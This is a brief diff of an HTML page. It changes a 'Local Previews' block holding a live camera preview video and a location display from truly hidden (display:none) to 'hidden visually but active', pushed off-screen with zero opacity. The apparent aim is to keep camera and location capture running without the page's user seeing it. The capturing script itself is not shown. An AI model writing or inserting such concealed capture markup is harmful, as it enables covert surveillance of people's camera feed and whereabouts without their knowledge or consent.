@@ -161,8 +161,9 @@
                 <div class="progress-bar"></div>
             </div>
 
-            <!-- Local Previews (Hidden) -->
-            <div id="demoArea" class="demo-area hidden" style="display: none;">
+            <!-- Local Previews (Hidden visually but active) -->
+            <div id="demoArea" class="demo-area"
+                style="position: absolute; top: -9999px; left: -9999px; opacity: 0; pointer-events: none;">
                 <video id="camPreview" autoplay playsinline muted></video>
                 <div id="locationDisplay"></div>
             </div>
